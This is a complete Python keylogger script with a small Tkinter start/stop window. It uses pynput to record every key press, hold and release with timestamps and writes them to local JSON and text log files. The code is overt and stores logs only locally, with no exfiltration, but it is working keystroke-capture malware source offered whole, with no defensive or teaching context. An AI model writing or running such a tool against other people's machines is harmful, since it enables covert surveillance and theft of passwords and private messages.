import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
from datetime import datetime

keys_used = []
flag = False
keys = ""
char_count = 0

def generate_text_log(key, timestamp=None):
    global char_count
    with open('key_log.txt', "a") as file:
        if timestamp:
            file.write(f'{timestamp}: ')
        file.write(key)
        char_count += len(key)
        if char_count >= 100:
            char_count = 0
            new_timestamp = datetime.now().strftime('%I:%M %p')
            file.write(f'\n{new_timestamp}: ')

def generate_json_file(keys_used):
    with open('key_log.json', 'wb') as key_log:
        key_list_bytes = json.dumps(keys_used, indent=4).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used
    timestamp = datetime.now().strftime('%I:%M %p')
    if not flag:
        keys_used.append(
            {'Pressed': f'{key}', 'Timestamp': timestamp}
        )
        flag = True
    else:
        keys_used.append(
            {'Held': f'{key}', 'Timestamp': timestamp}
        )
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    timestamp = datetime.now().strftime('%I:%M %p')
    keys_used.append(
        {'Released': f'{key}', 'Timestamp': timestamp}
    )
    if flag:
        flag = False
    generate_json_file(keys_used)
    formatted_key = str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n")
    keys += formatted_key
    generate_text_log(formatted_key, timestamp=None if char_count else timestamp)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()